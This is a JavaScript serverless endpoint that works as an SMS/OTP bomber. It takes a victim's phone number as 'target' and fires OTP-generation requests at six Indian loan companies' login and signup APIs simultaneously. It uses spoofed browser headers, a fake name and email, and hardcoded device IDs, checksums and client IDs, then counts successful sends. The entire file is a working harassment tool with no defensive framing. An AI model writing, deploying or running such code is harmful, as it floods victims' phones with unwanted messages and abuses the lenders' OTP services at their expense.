const axios = require('axios');

module.exports = async (req, res) => {
    const { mob } = req.query;

    if (!mob || mob.length < 10) {
        return res.status(400).json({ error: "Valid 10-digit number required" });
    }

    const commonHeaders = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Referer': 'https://www.google.com/'
    };

    // Helper to handle Form vs JSON
    const safePost = async (url, data, isJson = false) => {
        try {
            const body = isJson ? data : new URLSearchParams(data).toString();
            const headers = {
                ...commonHeaders,
                'Content-Type': isJson ? 'application/json' : 'application/x-www-form-urlencoded'
            };
            
            const response = await axios.post(url, body, { headers, timeout: 5000 });
            return response.status;
        } catch (error) {
            return error.response ? error.response.status : "failed";
        }
    };

    // Execute all 6 APIs
    const [avanse, bright, stashfin, incred, kamakshi, myflot] = await Promise.all([
        safePost('https://www.avanse.com/common-loan-apply/otp', {
            'contactNumber': mob, 'pageUrl': 'New Student Loan', 'name': 'Ckv Jvn', 'emailId': 'newuser.comop@gmail.com'
        }),
        safePost('https://brightloans.in/login-sbm', {
            'mobile': mob, 'current_page': 'login', 'device_id': '3c2f1fb977b9f389dc7e60f5f3fa9c44'
        }),
        safePost('https://api.stashfin.com/v2/api/', {
            'phone': mob, 'mode': 'generate_otp', 'checksum': 'f5d551b1531459cf6eee963f0476fc7b6079d9dd01a46e33beb7677d5e021e3c'
        }),
        safePost('https://gateway-api.incred.com/website-bff/public/v1/common/login/otpgenerate', {
            "MOBILE": mob, "UTM_DETAILS": { "utm_source": "google" }, "ON_BOARDING_TYPE": "FROM_LOAN_ENQUIRY", "STATUS": "Pending"
        }, true),
        safePost('https://loan-api.kamakshimoney.com/customers/customer-login-byMobile', { "mobile": mob }, true),
        safePost('https://prod.myflot.com/api/auth/get_otp', {
            'phoneNo': mob, 'clientId': 'aebccf8a-0f9d-4f6b-bd84-f1ad32e8f234'
        })
    ]);

    // Counter Logic
    const results = { avanse, bright, stashfin, incred, kamakshi, myflot };
    const total_sent = Object.keys(results).length;
    const total_success = Object.values(results).filter(status => status === 200 || status === 201).length;

    res.status(200).json({
        success: true,
        target: mob,
        total_sent,
        total_success,
        results
    });
};
